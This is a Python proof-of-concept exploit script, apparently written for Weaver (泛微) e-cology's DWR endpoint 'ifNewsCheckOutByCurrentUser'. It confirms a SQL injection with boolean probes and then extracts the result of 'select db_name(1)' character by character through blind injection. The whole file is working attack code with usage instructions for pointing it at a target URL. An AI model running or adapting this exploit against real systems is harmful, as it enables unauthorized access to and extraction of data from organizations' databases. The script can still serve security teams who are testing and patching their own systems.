
# coding:utf-8
import requests
import time
from random import Random
import string
import urllib3
urllib3.disable_warnings()
import sys


proxies = {
      #"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"
    }


def check(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Content-Type': 'text/plain'}
    body=f'''callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 AND 1=1
c0-param1=string:1
batchId=0'''

    response = requests.post(url, body, headers=headers, verify=False, timeout=8, allow_redirects=False)
    if "engine._remoteHandleCallback" in response.text and 'true' in response.text:
        s1 = True
    else:
        s1 = False

    body=f'''callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 AND 2=1
c0-param1=string:1
batchId=0'''
    response = requests.post(url, body, headers=headers, verify=False, timeout=8, allow_redirects = False)
    if "engine._remoteHandleCallback" in response.text and 'false' in response.text:
        s2 = True
    else:
        s2 = False

    if s1 and s2:
        print(f"[+] {url} 存在泛微ifNewsCheckOutByCurrentUser-sql注入漏洞! 开始查询select db_name(1)")
        return 1
    else:
        print("[!]", response.status_code)
        return 0

def poc(host):
    password_hash = ''
    char = 'abcdefghigklmnopqrstuvwxyz@._1234567890$ABCDEFGHIJKLMNOPQRSTUVWXYZ*'

    for i in range(1, 7):
        for q in char:
            if q == '*':
                exit()
            
            payload = f"and ASCII(SUBSTRING((select db_name(1)),{i},1))={ord(q)}"
            url = host + "/dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr"
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
                'Content-Type': 'text/plain'}
            body=f'''callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 {payload}
c0-param1=string:1
batchId=0'''
            resp = requests.post(url, body, headers=headers, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
            if "engine._remoteHandleCallback" in resp.text and 'true' in resp.text:
                password_hash += q
                print("第", i, "位：", q)
                i = i + 1
                break
            else:
                pass
    print("select db_name(1) 查询结果为：" + password_hash)


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: python weaver-ifNewsCheckOutByCurrentUser-sqli.py http://host/dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr')
        sys.exit(1)

    url = sys.argv[1]
    if check(url) == 1:
        poc(url)
    else:
        sys.exit()
